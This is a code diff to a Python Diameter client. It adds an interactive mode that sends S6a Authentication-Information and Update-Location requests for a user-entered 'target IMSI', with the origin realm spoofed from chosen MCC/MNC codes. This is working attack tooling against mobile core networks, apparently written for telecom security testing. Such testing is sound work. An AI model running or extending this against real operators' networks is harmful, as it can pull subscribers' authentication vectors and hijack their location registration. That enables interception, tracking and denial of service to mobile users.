@@ -2,6 +2,7 @@
 
 import diameter
 import diameter.common_messages as cm
+import diameter.S6a_3GPP as s6a
 import socket
 
 from colorama import Fore, Style
@@ -12,6 +13,50 @@ import os
 
 # .env file path
 ENV_FILE = Path(__file__).parent.parent / ".env"
+
+def send_authentication_info(destination_host, destination_realm, imsi, visited_plmn, s, buffer):
+    air = s6a.AuthenticationInformationRequest(diameter.VERSION_ONE)
+    air.session_id(origin_host + ";123456789".encode("ascii"))
+    air.auth_session_state()
+    air.origin_host(origin_host)
+    air.origin_realm(origin_realm)
+    air.destination_host(destination_host.encode("ascii"))
+    air.destination_realm(destination_realm.encode("ascii"))
+    air.user_name(imsi.encode("ascii"))
+    air.requested_eutran_authentication_info(1, immediate=True, resync=(os.urandom(16), os.urandom(14)))
+    air.visited_plmn_id(visited_plmn)
+    air.build()
+    print(Fore.YELLOW + "[*] Sending Authentication-Info Request (AIR) ..." + Style.RESET_ALL)
+    s.send(air.get_msg())
+    aia = diameter.DiameterResponse(s.recv(buffer))
+    aia.process()
+    if aia.success():
+        print(Fore.GREEN + "[+] DIAMETER_SUCCESS (AIA)" + Style.RESET_ALL)
+    else:
+        print(Fore.RED + "[+] DIAMETER_FAILURE (AIA)" + Style.RESET_ALL)
+
+def send_update_location(destination_realm, imsi, visited_plmn, s, buffer):
+    ulr = s6a.UpdateLocationRequest(diameter.VERSION_ONE)
+    ulr.session_id(origin_host + ";123456789".encode("ascii"))
+    ulr.origin_host(origin_host)
+    ulr.origin_realm(origin_realm)
+    ulr.destination_realm(destination_realm.encode("ascii"))
+    ulr.user_name(imsi.encode("ascii"))
+    ulr.rat_type(1004)
+    flags = 0
+    flags |= (1 << 5)
+    flags |= (1 << 4)
+    ulr.ulr_flags(flags)
+    ulr.visited_plmn_id(visited_plmn)
+    ulr.build()
+    print(Fore.YELLOW + "[*] Sending Update-Location Request (ULR) ..." + Style.RESET_ALL)
+    s.send(ulr.get_msg())
+    ula = diameter.DiameterResponse(s.recv(buffer))
+    ula.process()
+    if ula.success():
+        print(Fore.GREEN + "[+] DIAMETER_SUCCESS (ULA)" + Style.RESET_ALL)
+    else:
+        print(Fore.RED + "[+] DIAMETER_FAILURE (ULA)" + Style.RESET_ALL)
 
 def send_capabilities_exchange(cer, s, buffer):
     print(Fore.YELLOW + "[*] Sending Capabilities-Exchange Request (CER) ..." + Style.RESET_ALL)
@@ -59,7 +104,8 @@ if __name__ == "__main__":
         port = int(os.getenv("PORT"))
         protocol = os.getenv("PROTOCOL")
         origin_host = os.getenv("ORIGIN_HOST")
-        origin_realm = os.getenv("ORIGIN_REALM")
+        mcc = os.getenv("MCC")
+        mnc = os.getenv("MNC")
         product_name = os.getenv("PRODUCT_NAME")
         buffer = int(os.getenv("BUFFER"))
     else:
@@ -68,15 +114,20 @@ if __name__ == "__main__":
         port = int(input("Enter destination peer port (default 3868) > "))
         protocol = input("Enter transport protocol (TCP/SCTP) > ")
         origin_host = input("Enter your origin host > ")
-        origin_realm = input("Enter your origin realm > ")
+        mcc = input("Enter your MCC code (3 digits) > ")
+        mnc = input("Enter your MNC code (2 or 3 digits) > ")
         product_name = input("Enter your product name > ")
         buffer = 4096
 
+    temp_mnc = mnc
+    if len(temp_mnc) == 2:
+        temp_mnc = "0" + mnc
     origin_host = origin_host.encode("ascii")
-    origin_realm = origin_realm.encode("ascii")
+    origin_realm = f"epc.mnc{temp_mnc}.mcc{mcc}.3gppnetwork.org".encode("ascii")
+    # origin_host = f"{origin_host}.".encode("ascii") + origin_realm  # FQDN
     product_name = product_name.encode("ascii")
 
-    # Build requests
+    # Build standard requests
     print("\n[*] Initialize DIAMETER stack ...")
     cer = cm.CapabilitiesExchangeRequest(diameter.VERSION_ONE)
     cer.origin_host(origin_host)
@@ -111,11 +162,18 @@ if __name__ == "__main__":
     send_capabilities_exchange(cer, s, buffer)
 
     command = input("(" + Fore.RED + host + Style.RESET_ALL + ") > ")
-    while command != "dpr":
-        if command == "cer":
-            send_capabilities_exchange(cer, s, buffer)
-        elif command == "dwr":
+    while command != "exit":
+        if command == "dwr":
             send_device_watchdog(dwr, s, buffer)
+        elif command == "air":
+            destination_host = input("Enter destination host > ")
+            destination_realm = input("Enter destination realm > ")
+            imsi = input("Enter target IMSI > ")
+            send_authentication_info(destination_host, destination_realm, imsi, (mcc, mnc), s, buffer)
+        elif command == "ulr":
+            destination_realm = input("Enter destination realm > ")
+            imsi = input("Enter target IMSI > ")
+            send_update_location(destination_realm, imsi, (mcc, mnc), s, buffer)
         command = input("(" + Fore.RED + host + Style.RESET_ALL + ") > ")
 
     send_disconnect_peer(dpr, s, buffer)
